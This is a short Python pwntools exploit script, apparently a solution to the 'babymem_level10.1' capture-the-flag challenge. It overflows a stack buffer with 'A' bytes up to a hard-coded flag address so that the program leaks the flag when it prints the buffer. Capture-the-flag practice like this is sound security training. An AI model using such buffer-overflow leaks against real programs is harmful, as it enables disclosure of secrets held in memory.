#!/usr/bin/python3
from pwn import *

# Retrieve the ELF information from the binary
elf = ELF('/challenge/babymem_level10.1')

# Set the buffer location by debugging the program with gdb
buffer_address = 0x00007ffcd3f73900
# Set the flag location by debugging the program with gdb
flag_address = 0x00007ffcd3f73913

# Compute the buffer size by: flag_address - buffer_address
buffer_size = flag_address - buffer_address

# Run the program
io = elf.process()

# Send the dimension of the payload
io.recvuntil(b'Payload size: ')
io.sendline(f"{buffer_size}".encode())

# Build and send the payload in order to make the buffer content
# and the flag coincide. In this way, when we print the content
# of the buffer we print also the flag
PAYLOAD = b'A'*buffer_size
io.recvuntil(b'bytes)!')
io.sendline(PAYLOAD)

# Print the output of the program
print(io.recvall().decode())